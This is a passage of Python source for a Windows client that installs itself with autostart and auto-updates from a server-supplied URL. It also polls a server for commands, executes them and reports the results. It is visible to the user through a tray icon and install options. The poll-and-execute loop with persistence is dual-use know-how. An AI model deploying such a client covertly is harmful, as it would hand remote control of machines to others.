            target_executable.unlink()
        except OSError:
            pass

    if install_dir.exists():
        try:
            install_dir.rmdir()
        except OSError:
            pass

    return f"autostart_removed={TASK_NAME}"


def print_windows_install_help():
    script_name = Path(sys.argv[0]).name
    message = [
        "Windows EXE usage:",
        f"  {script_name} --install   Install client and enable autostart",
        f"  {script_name} --uninstall Remove autostart and installed EXE",
        f"  {script_name}             Run client in foreground",
    ]
    print("\n".join(message))


def install_if_needed_for_windows_exe():
    if IS_FROZEN and is_windows() and not is_running_from_installed_location():
        result = install_windows_autostart()
        raise RestartRequested(result)


def check_for_auto_update():
    if not AUTO_UPDATE_ENABLED:
        return

    release_info = get_latest_release_info()
    if not release_info:
        logging.info("Auto-update check skipped: release info not found")
        return

    latest_version = release_info["version"]
    if not is_newer_version(latest_version, APP_VERSION):
        logging.info("No update available. Current version: %s", APP_VERSION)
        return

    logging.info("New version available: %s", latest_version)
    apply_update_from_url(
        release_info["download_url"],
        source="auto",
        version_label=latest_version,
    )


def register_client_with_retry(client_id):
    while True:
        try:
            register_client(client_id)
            return
        except Exception as error:
            logging.exception("Register failed: %s", error)
            time.sleep(10)


def run_client():
    configure_logging()
    set_windows_app_id()
    show_startup_splash()
    start_windows_tray_icon()
    install_if_needed_for_windows_exe()
    client_id = load_or_create_client_id()
    register_client_with_retry(client_id)
    logging.info("Client started with id %s", client_id)
    next_update_check_at = 0

    try:
        while True:
            command_payload = None
            try:
                if time.time() >= next_update_check_at:
                    next_update_check_at = time.time() + AUTO_UPDATE_CHECK_INTERVAL_SECONDS
                    check_for_auto_update()

                command_payload = get_command(client_id)
                command = command_payload.get("command") if isinstance(command_payload, dict) else None

                if command:
                    logging.info("Received command: %s", command)
                    result = execute_command(command)
                    logging.info("Command completed")
                    report_result(client_id, result, command_payload)
                else:
                    logging.info("No command available")
            except RestartRequested as event:
                logging.info("Restart requested: %s", event.message)
                try:
                    report_result(client_id, event.message, command_payload)
                except Exception:
                    logging.exception("Failed to report restart event")
                return
            except requests.HTTPError as error:
                status_code = error.response.status_code if error.response is not None else "unknown"
                logging.exception("HTTP error while communicating with server: %s", status_code)
                if status_code == 404:
                    register_client_with_retry(client_id)
            except Exception as error:
                logging.exception("Client loop failed: %s", error)
                try:
                    report_result(client_id, f"error={error}", command_payload)
                except Exception:
                    logging.exception("Failed to report error")

            time.sleep(POLL_INTERVAL_SECONDS)
    finally:
        stop_windows_tray_icon()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        command = sys.argv[1].strip().lower()
        if command == "--install":
            result = install_windows_autostart()
            print(result)
            sys.exit(0)
        if command == "--uninstall":
            result = uninstall_windows_autostart()
            print(result)
            sys.exit(0)
        if command in {"--help", "/?"}:
            print_windows_install_help()
            sys.exit(0)

    try:
        run_client()
    except RestartRequested:
        sys.exit(0)
